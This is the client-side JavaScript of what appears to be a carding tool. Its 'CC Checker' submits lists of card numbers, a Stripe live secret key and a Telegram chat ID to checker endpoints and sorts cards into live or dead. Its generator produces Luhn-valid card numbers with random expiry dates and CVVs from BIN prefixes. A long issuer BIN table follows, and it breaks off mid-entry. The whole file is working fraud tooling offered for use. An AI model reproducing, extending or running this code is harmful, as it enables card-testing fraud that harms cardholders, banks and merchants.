$(document).ready(function(){
    var shown_x = "0";
    var shown_y = "0";
    var shown_z = "0";

    $("#clear_cvv").hide();
    $("#clear_ccn").hide();
    $("#clear_dead").hide();

    $("#howto").hide();

    $('#cardsLiveCVV').click(function(){
        playClick();
        var x = document.getElementsByClassName("live_cvv");
        for(var i=0; i < x.length; i++){
            if(shown_x == "0"){
                x[i].style.display = 'block';
            }else{
                x[i].style.display = 'none';
            }
        }
        if (shown_x == "1") {
            shown_x = "0";
        } else {
            shown_x = "1";
        }
        $("#clear_cvv").toggle();
    });
    $('#cardsLiveCCN').click(function(){
        playClick();
        var y = document.getElementsByClassName("live_ccn");
        for(var i=0; i < y.length; i++){
            if(shown_y == "0"){
                y[i].style.display = 'block';
            }else{
                y[i].style.display = 'none';
            }
        }
        if (shown_y == "1") {
            shown_y = "0";
        } else {
            shown_y = "1";
        }
        $("#clear_ccn").toggle();
    });
    
    $('#cardsDead').click(function(){
        playClick();
        var z = document.getElementsByClassName("dead");
        for(var i=0; i < z.length; i++){
            if(shown_z == "0"){
                z[i].style.display = 'block';
            }else{
                z[i].style.display = 'none';
            }
        }
        if (shown_z == "1") {
            shown_z = "0";
        } else {
            shown_z = "1";
        } 
        $("#clear_dead").toggle();
    });credits();
    document.onkeydown = function(evt) {
    evt = evt || window.event;
    if (evt.keyCode == 74) {
        playYamete();
    }
};
});


function checkCards() {
    var line = $("#cards").val();
    var line = line.replace(/^\s*[\r\n]/gm, '');
    $("#cards").val(line);
    
    var apis = $("#api").val();
    var api_selected = $("#api option:selected").text();
    var sk_live = $("#sk").val();

    var tele_msg = $("#tele_msg").val();
    var delay = $("#delay").val();

    if (line.length == 0){
        $('#Modal').modal('show');
        $('#ModalTitle').text("CC Checker");
        $('#ModalMsg').text("Error: Cards form empty.");
        playError();
        return;
    }
    if(api_selected.includes("need SK")){
        if (sk_live.length == 0) {
            $('#Modal').modal('show');
            $('#ModalTitle').text("SK Checker");
            $('#ModalMsg').text("Error: Secret Key (SK) form empty.");
            playError();
            return;
        }
        if (sk_live.indexOf('sk_live')==-1){
            $('#Modal').modal('show');
            $('#ModalTitle').text("SK Checker");
            $('#ModalMsg').text("Error: Secret Key (SK) provided is invalid.");
            playError();
            return;
        }
    }
    if(api_selected.includes("need SK")){
        var sk_live = $("#sk").val();
		setCookie('sk_stored', sk_live, '3');
    }else{
        var sk_live = "";
    }

    var telebot = $("#telebot").val();

    if(telebot.length == 0) {
        var telebot = "";
    }else{
    	setCookie('chatID_stored', telebot, '3');
    }

	playClick();
    var check_line = line.split("\n");
    var total = check_line.length;
    credits();
    check_line.forEach(function(value, index) {
        setTimeout(
            function(){
                $.ajax({
                    url: apis + '?cc_info=' + value + '&sk=' + sk_live + '&referrer=Tikol4Life&telebot=' + telebot + "&tele_msg=" + tele_msg,
                    type: 'GET',
                    async: true,
                    success: function(results) {
                        var count_live_cvv = (eval(document.getElementById("approved_counter_cvv").innerHTML) + 1);
                        var count_live_ccn = (eval(document.getElementById("approved_counter_ccn").innerHTML) + 1);
                        var count_dead = (eval(document.getElementById("decline_counter").innerHTML) + 1);
                        remove_line();
                        if(results.match("CVV LIVE")) {
                            $("#approved_counter_cvv").text(count_live_cvv);
                            $.ambiance({message: value,
                            title: "CVV Live",
                            timeout: 3,
                            type: "custom"});
                            playSuccess();
                        }else if(results.match("CCN LIVE")){
                            $("#approved_counter_ccn").text(count_live_ccn);
                            $.ambiance({message: value,
                            title: "CCN Live",
                            timeout: 3,
                            type: "custom"});
                            playSuccess();
                        }else if(results.match("DEAD")){
                            $("#decline_counter").text(count_dead);
                        }
                        result(results + "");
                    }
                });
            }, delay * index
        );
    });
}

function checkSK(){
    var sk_live = $("#sk").val();
    if (sk_live.length == 0) {
        $('#Modal').modal('show');
        $('#ModalTitle').text("SK Checker");
        $('#ModalMsg').text("Error: Secret Key (SK) form empty.");
        playError();
        return;
    }
    if (sk_live.indexOf('sk_live')==-1){
        $('#Modal').modal('show');
        $('#ModalTitle').text("SK Checker");
        $('#ModalMsg').text("Error: Secret Key (SK) provided is invalid.");
        playError();
        return;
    }
    playClick();
    $('#Modal').modal('show');
    $('#ModalTitle').text("SK Checker");
    $('#ModalMsg').text("Initailizing SK Checker Script...");

    setTimeout(
        function(){
            $.ajax({
            url: 'skcheck.php?sk=' + sk_live + '&referrer=Tikol4Life',
            type: 'GET',
            async: true,
            beforeSend: function () {
                $('#ModalMsg').text("Checking SK provided...");
            },
            success: function(data){
                if (data.match("LIVE")) {
                    $('#ModalMsg').text("SK provided is LIVE.");
                    playSuccess();
                }else if(data.match("DEAD")){
                    $('#ModalMsg').text("SK provided is DEAD.");
                    playError();
                }
            }
        });
    }, 2000);
}
function testBot(){
    var telebot = $("#telebot").val();
    if (telebot.length == 0) {
        $('#TeleMsg').text("Error: Chat ID empty.");
        setTimeout(function(){$('#TeleMsg').text("");},5000);
        playError();
        return;
    }
    playClick();
    setTimeout(
        function(){
            $.ajax({
            url: 'telebot.php?telebot=' + telebot + '&referrer=Tikol4Life',
            type: 'GET',
            async: true,
            
            success: function(data){
                if (data.match("LIVE")) {
                    $('#ModalMsg').text("SK provided is LIVE.");
                    playSuccess();
                }else if(data.match("DEAD")){
                    $('#ModalMsg').text("SK provided is DEAD.");
                    playError();
                }
            }
        });
    });
}


function modalCCGEN(){
    playClick();
    $('#ccGEN').modal('show');
}
function Settings(){
    playClick();
    $('#settingsModal').modal('show');
}
function copySK(){
    playClick();
    var copyText = document.getElementById("sk");
    copyText.select();
    copyText.setSelectionRange(0, 99999)
    document.execCommand("copy");
}
function credits(){
    if(!$("#footer").length){
        $("#container").append('<div class="footer" id="footer"><center><p style="color: #FFFFFF">Tikol4Life</p></center></div>');
    }else{
    	var x = document.getElementById("footer").textContent;
    	if (x != 'Tikol4Life') {
    		$("#container").append('<div class="footer" id="footer"><center><p style="color: #FFFFFF">Tikol4Life</p></center></div>');
    	}
    }
}
function remove_line() {
    var lines = $("#cards").val().split('\n');
    lines.splice(0, 1);
    $("#cards").val(lines.join("\n"));
}
function result(str) {
    $(".results").append(str + "");
}

function clearCVV() {
    playClick();
    var x = document.getElementsByClassName("live_cvv");
    for(var i=0; i < x.length; i++){
        x[i].remove();
    }
    var parent = document.getElementById("results");
    var SameClass1 = parent.getElementsByClassName("live_cvv");
    $("#approved_counter_cvv").text(SameClass1.length);
}
function clearCCN() {
    playClick();
    var y = document.getElementsByClassName("live_ccn");
    for(var i=0; i < y.length; i++){
        y[i].remove();
    }
    var parent = document.getElementById("results");
    var SameClass2 = parent.getElementsByClassName("live_ccn");
    $("#approved_counter_ccn").text(SameClass2.length);
}
function clearDead() {
    playClick();
    var z = document.getElementsByClassName("dead");
    for(var i=0; i < z.length; i++){
        z[i].remove();
    }
    var parent = document.getElementById("results");
    var SameClass3 = parent.getElementsByClassName("dead");
    $("#decline_counter").text(SameClass3.length);
}
function playYamete() {
    var hahahah = new Audio('./assets/sfx/hahahah.mp3');
    hahahah.play();
}
function playClick() {
    var click = new Audio('./assets/sfx/click.mp3');
    click.play();
}
function playError() {
    var error = new Audio('./assets/sfx/error.mp3');
    error.play();
}
function playSuccess() {
    var success = new Audio('./assets/sfx/success.mp3');
    success.play();
}
function onLoadChks() {
    document.getElementById('hidden_div').style.display = $("#api option:selected").text().includes("need SK") ? 'block' : 'none';
}
function showDiv(divId, element){
    document.getElementById(divId).style.display = $("#api option:selected").text().includes("need SK") ? 'block' : 'none';
}
function howto(){
    playClick();
    $("#howto").toggle();
}
function setCookie(cname, cvalue, exdays) {
	var d = new Date();
	d.setTime(d.getTime() + (exdays*24*60*60*1000));
	var expires = "expires="+ d.toUTCString();
	document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function ccgen() {
    init();
    $("#gerar").bind("click", function() {
        darkside(document.console.ccp.value, document.console.tr.value);
    });
    $("#ccpN").bind("change", function() {
        fillter();
    });
    $(document).ready(function() {
        $("#iniciar").click(function() {
            $('#result').fadeIn(2000);
            $(this).attr("disabled", true);
            $("#parar").attr("disabled", false);
            $("#status").html('Iniciado ... <i class="fa fa-check" aria-hidden="true"></i>');
            executar = true;
            iniciar();
        });
        $("#parar").click(function() {
            $(this).attr("disabled", true);
            $("#iniciar").attr("disabled", false);
            document.getElementById('cards').disabled = false;
            $("#status").html('Proceso parado ... <i class="fa fa-pause" aria-hidden="true"></i>');
            executar = false;
        });
    });
    var executar = true;
}

function fillter() {
    var binCC = document.console.ccp.value;
    var binID = parseInt(binCC.substring(0, 2));
    switch (binID) {
        case 34:
        case 37:
            var binLen = 15;
            break;
        case 40:
        case 41:
        case 42:
        case 43:
        case 44:
        case 45:
        case 46:
        case 47:
        case 48:
        case 49:
        case 50:
        case 51:
        case 52:
        case 53:
        case 54:
        case 55:
        case 60:
        case 64:
        case 65:
            binLen = 16;
            break;
    }
    var bin = document.console.ccp.value;
    for (var i = bin.length; i < binLen; i++) {
        bin += "x";
    }
    document.console.ccp.value = bin;
}

function init() {
    undefined = "Undefined";
    mkCClist();
}

function rnd(frN, toN) {
    var rN = Math.floor(Math.random() * (toN + 1 - frN)) + frN;
    return rN;
}

function unilenS(aS, ul, fc, p) {
    var rS = "" + aS;
    ul *= 1.0;
    if (fc == "" || fc == null) {
        fc = "0";
    }
    if (p == "" || p == null) {
        p = 0;
    }
    var rL = rS.length;
    if (rL < ul) {
        for (var i = 1; i <= ul - rL; i++) {
            if (p == 0) rS = "" + fc + rS;
            else rS += "" + fc;
        }
    }
    return rS;
}

function darkside(p1, tr) {
    tr *= 1.0;
    if (tr < 1 || tr == null) tr = 1;
    document.getElementById('cards').value = "";
    var ccghm = document.console.ccghm.value;
    var binip = p1;
    if (ccghm < 1) ccghm = 1;
    else if (ccghm > 10000) ccghm = 10000;
    document.console.ccghm.value = ccghm;
    if (p1 != "" && p1 != null) {
        var out = '';
        var jou = 0;
        
        for (var k = 1; k <= ccghm; k++) {
            if (p1 == 'rnd'){
            	p = c[Math.floor(Math.random() * (mxcards + 1 - 2)) + 2];
            }else{
            	p = p1;
            }
            var cn = chkCard(p);
            for (var i = tr; i >= 1; i--) {
                document.getElementById('cards').value = "Generating...";
                var cdi = sbtStringSpRnd(p, "x", "0123456789");
                var cf = sbtString(cdi, " -/abcdefghijklmnopqrstuvwyzABCDEFGHIJLMNOPQRSTUVWYZ");
                var clcd = chkLCD(cf);
                var ccck = chkCCCksum(cf, cn);
                if (clcd && ccck) break;
            }
            if (clcd && ccck) {
                var cn = chkCard(cdi);
                var ccnspc = "";
                var j;
                for (j = 0; j <= 3; j++) {
                    if (document.console.ccnsp.options[j].selected) {
                        break;
                    }
                }
                if (j == 1) ccnspc = " ";
                else if (j == 2) ccnspc = "-";
                var cdif = "";
                for (var i = 1; i <= cdi.length; i++) {
                    var aS = midS(cdi, i, 1);
                    if (aS == " ") aS = ccnspc;
                    cdif += aS;
                }


                if (document.console.emeses.value == 'rnd' && document.console.eyear.value == 'rnd') {
                    var dnowi = new Date();
                    var mes = unilenS(rnd(1, 12), 2, '0', 0);
                    var year = (dnowi.getFullYear() + rnd(1, 10));
                } else if (document.console.emeses.value != 'rnd' && document.console.eyear.value == 'rnd') {
                    var dnowi = new Date();
                    var mes = document.console.emeses.value;
                    var year = (dnowi.getFullYear() + rnd(1, 10));
                } else if (document.console.emeses.value == 'rnd' && document.console.eyear.value != 'rnd') {
                    var dnowi = new Date();
                    var mes = unilenS(rnd(1, 12), 2, '0', 0);
                    var year = document.console.eyear.value;
                } else if (document.console.emeses.value != 'rnd' && document.console.eyear.value != 'rnd') {
                    var mes = document.console.emeses.value;
                    var year = document.console.eyear.value;
                } else{
                	var ccexp = '';
                }
                

                if (document.console.eccv.value == 'rnd') {
                    var binC = cdif.toString();
                    var tipo = parseInt(binC.substring(0, 1));
                    if (tipo == 3) var eccv = (Math.floor(Math.random() * (9998 - 1102 + 1)) + 1102);
                    else var eccv = (Math.floor(Math.random() * (998 - 112 + 1)) + 112);
                }else if (document.console.eccv.value != 'rnd'){
                	var eccv = document.console.eccv.value;
                }else{
                	var eccv = '';
                }


                if (out != "") {
					var out = out += "\n";	
                }
                var out = out += cdif;
                var out = out += "|" + mes + '|' + year;
                var out = out += "|" + eccv;
            } else {
            	var out = "Sorry, no valid BIN is inserted, or BIN is incomplete, check if the format is correct, eg 552289xxxxxxxxxx";
            }
        }
        if (jou == 2) var out = out + "</xml>";
        else if (jou == 3) var out = out + "}";
        document.getElementById('cards').value = out;
        
    }
}

function chkCard(cdi) {
    cdi += "";
    if (c[1] == undefined || c[1] == null || c[1] == "") {
        mkCClist();
    }
    var ccn = 0;
    var cn = "Unknown"
    var cf = sbtString(cdi, " -/abcdefghijklmnopqrstuvwyzABCDEFGHIJLMNOPQRSTUVWYZ");
    if (leftS(cf, 1) == "4") {
        cf = leftS(cf, 8);
    }
    for (var i = 1; i <= tw; i++) {
        var cct = sbtString(c[i], " -/abcdefghijklmnopqrstuvwyzABCDEFGHIJLMNOPQRSTUVWYZ");
        if (leftS(cf, 1) == "4") {
            cct = leftS(cct, 8);
        }
        var ccc = cmpPattern(cf, cct);
        if (ccc) {
            ccn = i;
            break;
        }
    }
    if (ccn > 0) {
        cn = cd[i];
    }
    return cn;
}

function chkCCCksum(cf, cn) {
    var r = false;
    var w = "21";
    var ml = "";
    var j = 1;
    for (var i = 1; i <= cf.length - 1; i++) {
        var m = midS(cf, i, 1) * midS(w, j, 1);
        m = sumDigits(m);
        ml += "" + m;
        j++;
        if (j > w.length) j = 1;
    }
    var ml2 = sumDigits(ml, -1);
    var ml1 = (sumDigits(ml2, -1) * 10 - ml2) % 10;
    if (ml1 == rightS(cf, 1)) r = true;
    return r;
}

function chkLCD(cf) {
    var r = false;
    cf += "";
    var bl = isdiv(cf.length, 2);
    var ctd = 0;
    for (var i = 1; i <= cf.length; i++) {
        var cdg = midS(cf, i, 1);
        if (isdiv(i, 2) != bl) {
            cdg *= 2;
            if (cdg > 9) cdg -= 9;
        }
        ctd += cdg * 1.0;
    }
    if (isdiv(ctd, 10)) r = true;
    return r;
}

function mkCClist() {
    tw = 450;
    c = new makeArray(tw);
    cd = new makeArray(tw);
    var i = 1;
    c[i] = "37xxxxxxxxxxxxx";
    cd[i] = "AmEx";
    i++;
    c[i] = "3782xxxxxxxxxxx";
    cd[i] = "AmEx Small Corporate Card";
    i++;
    c[i] = "3787xxxxxxxxxxx";
    cd[i] = "AmEx Small Corporate Card";
    i++;
    c[i] = "37x8xxxxxxxxxxx";
    cd[i] = "AmEx Gold";
    i++;
    c[i] = "37x37xxxxxxxxxx";
    cd[i] = "AmEx Platinum";
    i++;
    c[i] = "37xxxxxxxx11xxx";
    cd[i] = "AmEx issued since 1995";
    i++;
    c[i] = "30xxxxxxxxxxxx";
    cd[i] = "Diners Club";
    i++;
    c[i] = "31xxxxxxxxxxxx";
    cd[i] = "Diners Club";
    i++;
    c[i] = "35xxxxxxxxxxxx";
    cd[i] = "Diners Club";
    i++;
    c[i] = "36xxxxxxxxxxxx";
    cd[i] = "Diners Club";
    i++;
    c[i] = "38xxxxxxxxxxxx";
    cd[i] = "Carte Blanche";
    i++;
    c[i] = "35xxxxxxxxxxxxxx";
    cd[i] = "JCB (Japanese Credit Bureau)";
    i++;
    c[i] = "400314xxxxxxxxxx";
    cd[i] = "Visa Debit-Banca Monte Dei Paschi Di Siena (Italy)";
    i++;
    c[i] = "400315xxxxxxxxxx";
    cd[i] = "Visa-Banca Monte Dei Paschi Di Siena (Italy)";
    i++;
    c[i] = "40240238xxxxxxxx";
    cd[i] = "Visa Gold-Bank of America";
    i++;
    c[i] = "4019xxxxxxxxxxxx";
    cd[i] = "Visa CV/Gold-Bank of America";
    i++;
    c[i] = "4024xxxxxxxxxxxx";
    cd[i] = "Visa PV-Bank of America";
    i++;
    c[i] = "4040xxxxxxxxxxxx";
    cd[i] = "Visa CV-Wells Fargo";
    i++;
    c[i] = "4048xxxxxxxxxxxx";
    cd[i] = "Visa CV";
    i++;
    c[i] = "40240071xxxxxxxx";
    cd[i] = "Visa-Wells Fargo";
    i++;
    c[i] = "4013xxxxxxxxxxxx";
    cd[i] = "Visa-Citibank";
    i++;
    c[i] = "4019xxxxxxxxxxxx";
    cd[i] = "Visa-Bank of America";
    i++;
    c[i] = "402360xxxxxxxxxx";
    cd[i] = "Visa Electron Prepaid-Poste Italiane (Italy)";
    i++;
    c[i] = "4024xxxxxxxxxxxx";
    cd[i] = "Visa-Bank of America";
    i++;
    c[i] = "4027xxxxxxxxxxxx";
    cd[i] = "Visa-Rockwell Federal Credit Union";
    i++;
    c[i] = "4032xxxxxxxxxxxx";
    cd[i] = "Visa-Household Bank";
    i++;
    c[i] = "4052xxxxxxxxxxxx";
    cd[i] = "Visa-First Cincinnati";
    i++;
    c[i] = "4060xxxxxxxxxxxx";
    cd[i] = "Visa-Associates National Bank";
    i++;
    c[i] = "4070xxxxxxxxxxxx";
    cd[i] = "Visa-Security Pacific";
    i++;
    c[i] = "4071xxxxxxxxxxxx";
    cd[i] = "Visa-Colonial National Bank";
    i++;
    c[i] = "4094xxxxxxxxxxxx";
    cd[i] = "Visa-A.M.C. Federal Credit Union";
    i++;
    c[i] = "4113xxxxxxxxxxxx";
    cd[i] = "Visa-Valley National Bank";
    i++;
    c[i] = "4114xxxxxxxxxxxx";
    cd[i] = "Visa-Chemical Bank";
    i++;
    c[i] = "4121xxxxxxxxxxxx";
    cd[i] = "Visa-Pennsylvania State Employees Credit Union";
    i++;
    c[i] = "4121xxxxxxxxxxxx";
    cd[i] = "Visa CV-Signet Bank";
    i++;
    c[i] = "4122xxxxxxxxxxxx";
    cd[i] = "Visa-Union Trust";
    i++;
    c[i] = "4125xxxxxxxxxxxx";
    cd[i] = "Visa-Marine Midland";
    i++;
    c[i] = "4128xxxxxxxxx";
    cd[i] = "Visa CV-Citibank";
    i++;
    c[i] = "4128xxxxxxxxxxxx";
    cd[i] = "Visa CV-Citibank";
    i++;
    c[i] = "4131xxxxxxxxxxxx";
    cd[i] = "Visa-State Street Bank";
    i++;
    c[i] = "4225xxxxxxxxxxxx";
    cd[i] = "Visa-Chase Manhattan Bank";
    i++;
    c[i] = "4226xxxxxxxxxxxx";
    cd[i] = "Visa-Chase Manhattan Bank";
    i++;
    c[i] = "4231xxxxxxxxxxxx";
    cd[i] = "Visa-Chase Lincoln First Classic";
    i++;
    c[i] = "4232xxxxxxxxxxxx";
    cd[i] = "Visa-Chase Lincoln First Classic";
    i++;
    c[i] = "4239xxxxxxxxxxxx";
    cd[i] = "Visa-Corestates";
    i++;
    c[i] = "4241xxxxxxxxxxxx";
    cd[i] = "Visa-National Westminster Bank";
    i++;
    c[i] = "4250xxxxxxxxxxxx";
    cd[i] = "Visa-First Chicago Bank";
    i++;
    c[i] = "4253xxxxxxxxxxxx";
    cd[i] = "Visa-Consumers Edge";
    i++;
    c[i] = "42545123xxxxxxxx";
    cd[i] = "Visa Premier card-Security First";
    i++;
    c[i] = "4254xxxxxxxxxxxx";
    cd[i] = "Visa-Security First";
    i++;
    c[i] = "4271382xxxxxxxxx";
    cd[i] = "Visa PV-Citibank";
    i++;
    c[i] = "4271xxxxxxxxxxxx";
    cd[i] = "Visa-Citibank/Citicorp";
    i++;
    c[i] = "4301xxxxxxxxxxxx";
    cd[i] = "Visa-Monogram Bank";
    i++;
    c[i] = "4302xxxxxxxxxxxx";
    cd[i] = "Visa-H.H.B.C.";
    i++;
    c[i] = "4311xxxxxxxxxxxx";
    cd[i] = "Visa-First National Bank of Louisville";
    i++;
    c[i] = "4317xxxxxxxxxxxx";
    cd[i] = "Visa-Gold Dome";
    i++;
    c[i] = "4327xxxxxxxxxxxx";
    cd[i] = "Visa-First Atlanta";
    i++;
    c[i] = "4332xxxxxxxxxxxx";
    cd[i] = "Visa-First American Bank";
    i++;
    c[i] = "4339xxxxxxxxxxxx";
    cd[i] = "Visa-Primerica Bank";
    i++;
    c[i] = "4342xxxxxxxxxxxx";
    cd[i] = "Visa-N.C.M.B. / Nations Bank";
    i++;
    c[i] = "4356xxxxxxxxxxxx";
    cd[i] = "Visa-National Bank of Delaware";
    i++;
    c[i] = "4368xxxxxxxxxxxx";
    cd[i] = "Visa-National West";
    i++;
    c[i] = "4387xxxxxxxxxxxx";
    cd[i] = "Visa-Bank One";
    i++;
    c[i] = "4388xxxxxxxxxxxx";
    cd[i] = "Visa-First Signature Bank & Trust";
    i++;
    c[i] = "4401xxxxxxxxxxxx";
    cd[i] = "Visa-Gary-Wheaton Bank";
    i++;
    c[i] = "4413xxxxxxxxxxxx";
    cd[i] = "Visa-Firstier Bank Lincoln";
    i++;
    c[i] = "4418xxxxxxxxxxxx";
    cd[i] = "Visa-Bank of Omaha";
    i++;
    c[i] = "4421xxxxxxxxxxxx";
    cd[i] = "Visa-Indiana National Bank";
    i++;
    c[i] = "4424xxxxxxxxxxxx";
    cd[i] = "Visa-Security Pacific National Bank";
    i++;
    c[i] = "4428xxxxxxxxxxxx";
    cd[i] = "Visa-Bank of Hoven";
    i++;
    c[i] = "4436xxxxxxxxxxxx";
    cd[i] = "Visa-Security Bank & Trust";
    i++;
    c[i] = "4443xxxxxxxxxxxx";
    cd[i] = "Visa-Merril Lynch Bank & Trust";
    i++;
    c[i] = "4447xxxxxxxxxxxx";
    cd[i] = "Visa-AmeriTrust";
    i++;
    c[i] = "4448020xxxxxx";
    cd[i] = "Visa Premier card";
    i++;
    c[i] = "4452xxxxxxxxxxxx";
    cd[i] = "Visa-Empire Affiliates Federal Credit Union";
    i++;
    c[i] = "4498xxxxxxxxxxxx";
    cd[i] = "Visa-Republic Savings";
    i++;
    c[i] = "4502xxxxxxxxxxxx";
    cd[i] = "Visa-C.I.B.C.";
    i++;
    c[i] = "4503xxxxxxxxxxxx";
    cd[i] = "Visa-Canadian Imperial Bank";
    i++;
    c[i] = "4506xxxxxxxxxxxx";
    cd[i] = "Visa-Belgium A.S.L.K.";
    i++;
    c[i] = "4510xxxxxxxxxxxx";
    cd[i] = "Visa-Royal Bank of Canada";
    i++;
    c[i] = "4520xxxxxxxxxxxx";
    cd[i] = "Visa-Toronto Dominion of Canada";
    i++;
    c[i] = "4537xxxxxxxxxxxx";
    cd[i] = "Visa-Bank of Nova Scotia";
    i++;
    c[i] = "4538xxxxxxxxxxxx";
    cd[i] = "Visa-Bank of Nova Scotia";
    i++;
    c[i] = "4539xxxxxxxxxxxx";
    cd[i] = "Visa-Barclays (UK)";
    i++;
    c[i] = "4543xxxxxxxxxxxx";
    cd[i] = "Visa-First Direct";
    i++;
    c[i] = "4544xxxxxxxxxxxx";
    cd[i] = "Visa-T.S.B. Bank";
    i++;
    c[i] = "4556xxxxxxxxxxxx";
    cd[i] = "Visa-Citibank";
    i++;
    c[i] = "4564xxxxxxxxxxxx";
    cd[i] = "Visa-Bank of Queensland";
    i++;
    c[i] = "4673xxxxxxxxxxxx";
    cd[i] = "Visa-First Card";
    i++;
    c[i] = "4678xxxxxxxxxxxx";
    cd[i] = "Visa-Home Federal";
    i++;
    c[i] = "4707xxxxxxxxxxxx";
    cd[i] = "Visa-Tompkins County Trust";
    i++;
    c[i] = "47121250xxxxxxxx";
    cd[i] = "Visa-IBM Credit Union";
    i++;
    c[i] = "4719xxxxxxxxxxxx";
    cd[i] = "Visa-Rocky Mountain";
    i++;
    c[i] = "4721xxxxxxxxxxxx";
    cd[i] = "Visa-First Security";
    i++;
    c[i] = "4722xxxxxxxxxxxx";
    cd[i] = "Visa-West Bank";
    i++;
    c[i] = "4726xxxxxxxxxxxx";
    cd[i] = "Visa CV-Wells Fargo";
    i++;
    c[i] = "4783xxxxxxxxxxxx";
    cd[i] = "Visa-AT&T's Universal Card";
    i++;
    c[i] = "4784xxxxxxxxxxxx";
    cd[i] = "Visa-AT&T's Universal Card";
    i++;
    c[i] = "4800xxxxxxxxxxxx";
    cd[i] = "Visa-M.B.N.A. North America";
    i++;
    c[i] = "4811xxxxxxxxxxxx";
    cd[i] = "Visa-Bank of Hawaii";
    i++;
    c[i] = "4819xxxxxxxxxxxx";
    cd[i] = "Visa-Macom Federal Credit Union";
    i++;
    c[i] = "4820xxxxxxxxxxxx";
    cd[i] = "Visa-IBM Mid America Federal Credit Union";
    i++;
    c[i] = "4833xxxxxxxxxxxx";
    cd[i] = "Visa-U.S. Bank";
    i++;
    c[i] = "4842xxxxxxxxxxxx";
    cd[i] = "Visa-Security Pacific Washington";
    i++;
    c[i] = "4897xxxxxxxxxxxx";
    cd[i] = "Visa-Village Bank of Chicago";
    i++;
    c[i] = "4921xxxxxxxxxxxx";
    cd[i] = "Visa-Hong Kong National Bank";
    i++;
    c[i] = "4929xxxxxxxxxxxx";
    cd[i] = "Visa CV-Barclay Card (UK)";
    i++;
    c[i] = "45399710xxxxxxxx";
    cd[i] = "Visa-Banco di Napoli (Italy)";
    i++;
    c[i] = "4557xxxxxxxxxxxx";
    cd[i] = "Visa-BNL (Italy)";
    i++;
    c[i] = "4908xxxxxxxxxxxx";
    cd[i] = "Visa-Carta Moneta-CARIPLO/Intesa (Italy)";
    i++;
    c[i] = "4xxx9x604015xxxx";
    cd[i] = "Visa-Carta Sì-Unipol Banca (Italy)";
    i++;
    c[i] = "4xxx9x144046xxxx";
    cd[i] = "Visa-Carta Sì-Banco di Sardegna (Italy)";
    i++;
    c[i] = "4xxx9xxx40xxxxxx";
    cd[i] = "Visa-Carta Sì (Italy)";
    i++;
    c[i] = "4532xxxxxxxxxxxx";
    cd[i] = "Visa-Credito Italiano (Italy)";
    i++;
    c[i] = "45475900xxxxxxxx";
    cd[i] = "Visa Gold-bank ganadero BBV (Colombia)";
    i++;
    c[i] = "4916xxxxxxxxxxxx";
    cd[i] = "Visa-MBNA Bank";
    i++;
    c[i] = "4xxxxxxxxxxxxx";
    cd[i] = "Visa";
    i++;
    c[i] = "4xxxxxxxxxxxxxxx";
    cd[i] = "Visa";
    i++;
    c[i] = "5031xxxxxxxxxxxx";
    cd[i] = "MasterCard-Maryland of North America";
    i++;
    c[i] = "5100xxxxxxxxxxxx";
    cd[i] = "MasterCard-Southwestern States Bankard Association";
    i++;
    c[i] = "5110xxxxxxxxxxxx";
    cd[i] = "MasterCard-Universal Travel Voucher";
    i++;
    c[i] = "5120xxxxxxxxxxxx";
    cd[i] = "MasterCard-Western States Bankard Association";
    i++;
    c[i] = "5130xxxxxxxxxxxx";
    cd[i] = "MasterCard-Eurocard France";
    i++;
    c[i] = "5140xxxxxxxxxxxx";
    cd[i] = "MasterCard-Mountain States Bankard Association";
    i++;
    c[i] = "5150xxxxxxxxxxxx";
    cd[i] = "MasterCard-Credit Systems Inc.";
    i++;
    c[i] = "5160xxxxxxxxxxxx";
    cd[i] = "MasterCard-Westpac Banking Corporation";
    i++;
    c[i] = "5170xxxxxxxxxxxx";
    cd[i] = "MasterCard-Midamerica Bankard Association";
    i++;
    c[i] = "5172xxxxxxxxxxxx";
    cd[i] = "MasterCard-First Bank Card Center";
    i++;
    c[i] = "518xxxxxxxxxxxxx";
    cd[i] = "MasterCard-Computer Communications of America";
    i++;
    c[i] = "519xxxxxxxxxxxxx";
    cd[i] = "MasterCard-Bank of Montreal";
    i++;
    c[i] = "5201xxxxxxxxxxxx";
    cd[i] = "MasterCard-Mellon Bank N.A.";
    i++;
    c[i] = "5202xxxxxxxxxxxx";
    cd[i] = "MasterCard-Central Trust Company N.A.";
    i++;
    c[i] = "5204xxxxxxxxxxxx";
    cd[i] = "MasterCard-Security Pacific National Bank";
    i++;
    c[i] = "5205xxxxxxxxxxxx";
    cd[i] = "MasterCard-Promocion y Operacion S.A.";
    i++;
    c[i] = "5206xxxxxxxxxxxx";
    cd[i] = "MasterCard-Banco Nacional do Mexico";
    i++;
    c[i] = "5207xxxxxxxxxxxx";
    cd[i] = "MasterCard-New England Bankard Association";
    i++;
    c[i] = "5208xxxxxxxxxxxx";
    cd[i] = "MasterCard-Million Card Service Co. Ltd.";
    i++;
    c[i] = "5209xxxxxxxxxxxx";
    cd[i] = "MasterCard-The Citizens & Southern National Bank";
    i++;
    c[i] = "5210xxxxxxxxxxxx";
    cd[i] = "MasterCard-Kokunai Shinpan Company Ltd.";
    i++;
    c[i] = "5211xxxxxxxxxxxx";
    cd[i] = "MasterCard-Chemical Bank Delaware";
    i++;
    c[i] = "5212xxxxxxxxxxxx";
    cd[i] = "MasterCard-F.C.C. National Bank";
    i++;
    c[i] = "5213xxxxxxxxxxxx";
    cd[i] = "MasterCard-The Bankcard Association Inc.";
    i++;
    c[i] = "5215xxxxxxxxxxxx";
    cd[i] = "MasterCard-Marine Midland Bank N.A.";
    i++;
    c[i] = "5216xxxxxxxxxxxx";
    cd[i] = "MasterCard-Old Kent Bank & Trust Co.";
    i++;
    c[i] = "5217xxxxxxxxxxxx";
    cd[i] = "MasterCard-Union Trust";
    i++;
    c[i] = "5218xxxxxxxxxxxx";
    cd[i] = "MasterCard-Citibank/Citicorp";
    i++;
    c[i] = "5219xxxxxxxxxxxx";
    cd[i] = "MasterCard-Central Finance Co. Ltd.";
    i++;
    c[i] = "5220xxxxxxxxxxxx";
    cd[i] = "MasterCard-Sovran Bank/Central South";
    i++;
    c[i] = "5221xxxxxxxxxxxx";
    cd[i] = "MasterCard-Standard Bank of South Africa Ltd.";
    i++;
    c[i] = "5222xxxxxxxxxxxx";
    cd[i] = "MasterCard-Security Bank & Trust Company";
    i++;
    c[i] = "5223xxxxxxxxxxxx";
    cd[i] = "MasterCard-Trustmark National Bank";
    i++;
    c[i] = "5224xxxxxxxxxxxx";
    cd[i] = "MasterCard-Midland Bank";
    i++;
    c[i] = "5225xxxxxxxxxxxx";
    cd[i] = "MasterCard-First Pennsylvania Bank N.A.";
    i++;
    c[i] = "5226xxxxxxxxxxxx";
